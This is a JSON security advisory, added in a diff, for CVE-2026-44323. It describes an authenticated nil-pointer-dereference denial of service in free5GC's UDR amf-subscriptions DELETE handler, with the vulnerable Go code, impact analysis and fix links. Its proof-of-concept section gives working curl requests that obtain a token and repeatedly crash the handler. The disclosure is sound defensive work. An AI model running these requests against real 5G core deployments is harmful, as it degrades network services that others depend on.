@@ -1,0 +1,57 @@
+{
+  "id": "GHSA-4rqf-grm6-vf75",
+  "modified": "2026-05-08T23:01:22.291332Z",
+  "published": "2026-05-08T22:52:00Z",
+  "aliases": [
+    "CVE-2026-44323"
+  ],
+  "summary": "free5GC's UDR nudr-dr DELETE amf-subscriptions panics on missing subsId when UE state exists (nil pointer dereference)",
+  "details": "### Summary\nfree5GC's UDR `nudr-dr` `DELETE /subscription-data/{ueId}/{servingPlmnId}/ee-subscriptions/{subsId}/amf-subscriptions` handler contains a nil-pointer dereference reachable from a single authenticated request, after one preparatory authenticated EE-subscription create. The handler checks `_, ok = UESubsData.EeSubscriptionCollection[subsId]` and sets a `404` problem-details on the miss path, but then continues to `UESubsData.EeSubscriptionCollection[subsId].AmfSubscriptionInfos` -- dereferencing the same missing entry instead of returning. Gin recovery converts the panic into `HTTP 500`, but the endpoint remains repeatedly panicable.\n\nThis endpoint requires a valid `nudr-dr` OAuth2 access token (i.e. PR:L, NOT PR:N), so this is scored as an authenticated panic-DoS, not as an unauth-bypass finding.\n\n### Details\nValidated against the UDR container in the official Docker compose lab.\n- Source repo tag: `v4.2.1`\n- Running Docker image: `free5gc/udr:v4.2.1`\n- Runtime UDR commit: `754d23b0`\n- Docker validation date: 2026-03-22\n- UDR endpoint: `http://10.100.200.11:8000`\n\nPrecondition (one authenticated EE-subscription create allocates UE state):\n```go\nif !ok {\n    udrSelf.UESubsCollection.Store(ueId, new(udr_context.UESubsData))\n    value, _ = udrSelf.UESubsCollection.Load(ueId)\n}\n...\nUESubsData.EeSubscriptionCollection[newSubscriptionID] = new(udr_context.EeSubscriptionCollection)\n```\n\nVulnerable handler (delete on amf-subscriptions): the `ok` miss path sets `pd` but does not return, so the very next line dereferences the nil entry:\n```go\n_, ok = UESubsData.EeSubscriptionCollection[subsId]\nif !ok {\n    pd = util.ProblemDetailsNotFound(\"SUBSCRIPTION_NOT_FOUND\")\n}\n\nif UESubsData.EeSubscriptionCollection[subsId].AmfSubscriptionInfos == nil {\n    pd = util.ProblemDetailsNotFound(\"AMFSUBSCRIPTION_NOT_FOUND\")\n}\n```\nWhen `subsId` is absent, `UESubsData.EeSubscriptionCollection[subsId]` is nil, and `.AmfSubscriptionInfos` panics with `runtime error: invalid memory address or nil pointer dereference`.\n\nCode evidence (paths in `free5gc/udr`):\n- Precondition route + handler (EE-subscription create that allocates UE state):\n  - `NFs/udr/internal/sbi/api_datarepository.go:600`\n  - `NFs/udr/internal/sbi/api_datarepository.go:602`\n  - `NFs/udr/internal/sbi/api_datarepository.go:2528`\n  - `NFs/udr/internal/sbi/processor/event_exposure_subscriptions_collection.go:25`\n  - `NFs/udr/internal/sbi/processor/event_exposure_subscriptions_collection.go:30`\n  - `NFs/udr/internal/sbi/processor/event_exposure_subscriptions_collection.go:38`\n- Vulnerable delete route + dispatch:\n  - `NFs/udr/internal/sbi/api_datarepository.go:2161`\n  - `NFs/udr/internal/sbi/api_datarepository.go:2172`\n- Panic root cause (nil deref):\n  - `NFs/udr/internal/sbi/processor/event_amf_subscription_info_document.go:62`\n  - `NFs/udr/internal/sbi/processor/event_amf_subscription_info_document.go:64`\n  - `NFs/udr/internal/sbi/processor/event_amf_subscription_info_document.go:69`\n\n### PoC\nReproduced end-to-end against the running UDR at `http://10.100.200.11:8000`.\n\n1. Restart UDR (clean state):\n```\ndocker restart udr\n```\n\n2. Obtain a valid `nudr-dr` token from NRF:\n```\ncurl -sS -X POST 'http://10.100.200.3:8000/oauth2/token' \\\n  -H 'Content-Type: application/x-www-form-urlencoded' \\\n  --data 'grant_type=client_credentials\u0026nfType=NEF\u0026nfInstanceId=eb9990de-4cd3-41b0-b5d9-c2102b088c57\u0026targetNfType=UDR\u0026scope=nudr-dr'\n```\n\n3. Create one EE subscription to populate `UESubsCollection` for `ueId=x`:\n```\ncurl -i -sS -X POST \\\n  'http://10.100.200.11:8000/nudr-dr/v2/subscription-data/x/context-data/ee-subscriptions' \\\n  -H 'Authorization: Bearer \u003cvalid_nudr_dr_jwt\u003e' \\\n  -H 'Content-Type: application/json' \\\n  --data '{}'\n```\n```\nHTTP/1.1 201 Created\n```\n\n4. Trigger the panic with a nonexistent `subsId`:\n```\ncurl -i -sS -X DELETE \\\n  'http://10.100.200.11:8000/nudr-dr/v2/subscription-data/x/bad/ee-subscriptions/x/amf-subscriptions' \\\n  -H 'Authorization: Bearer \u003cvalid_nudr_dr_jwt\u003e'\n```\n```\nHTTP/1.1 500 Internal Server Error\nContent-Length: 0\n```\n\n5. UDR container logs (`docker logs udr`) confirm the nil-pointer panic at `event_amf_subscription_info_document.go:69` inside `RemoveAmfSubscriptionsInfoProcedure`:\n```\n[ERRO][UDR][GIN] panic: runtime error: invalid memory address or nil pointer dereference\ngithub.com/free5gc/udr/internal/sbi/processor.(*Processor).RemoveAmfSubscriptionsInfoProcedure\n    .../event_amf_subscription_info_document.go:69\ngithub.com/free5gc/udr/internal/sbi.(*Server).HandleRemoveAmfSubscriptionsInfo\n    .../api_datarepository.go:2172\n[INFO][UDR][GIN] | 500 | DELETE | /nudr-dr/v2/subscription-data/x/bad/ee-subscriptions/x/amf-subscriptions |\n```\n\n### Impact\nNULL pointer dereference (CWE-476) in an authenticated UDR data-repository handler, caused by improper handling of the missing-subsId branch (CWE-754): the handler sets a problem-details value but does not return, then dereferences the same missing map entry.\n\nThis is NOT framed as an auth-bypass finding: the endpoint requires a valid `nudr-dr` OAuth2 access token. A network attacker who already holds (or can obtain) a valid token can:\n- Trigger a reliable, repeatable nil-deref panic on the `amf-subscriptions` delete route after one preparatory POST that allocates UE state for the chosen `ueId`.\n- Repeat the trigger to sustain a per-request panic-DoS on UDR's data-repository surface, with each panic costing more CPU + log writes than the intended `404 SUBSCRIPTION_NOT_FOUND` response would have.\n\nNo Confidentiality impact (the response is `500` with empty body; no UE data is returned to the attacker via the panic). No persistent Integrity impact from the panic itself (the EE subscription created during the precondition is in-memory state owned by UDR's intended data-repository semantics, and is not corrupted by the delete-time panic). Availability impact is limited to per-request degradation (Gin recovers; the UDR process keeps running).\n\nAffected: free5gc v4.2.1.\n\nUpstream issue: https://github.com/free5gc/free5gc/issues/919\nUpstream fix: https://github.com/free5gc/udr/pull/60",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/free5gc/udr",
+        "purl": "pkg:golang/github.com/free5gc/udr"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.4.3"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-4rqf-grm6-vf75/GHSA-4rqf-grm6-vf75.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/free5gc/free5gc/security/advisories/GHSA-4rqf-grm6-vf75"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/free5gc/free5gc/issues/919"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/free5gc/udr/pull/60"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/free5gc/udr/commit/8a1d3c63be99d378806d771f086ff32f1867da99"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/free5gc/free5gc"
+    }
+  ]
+}
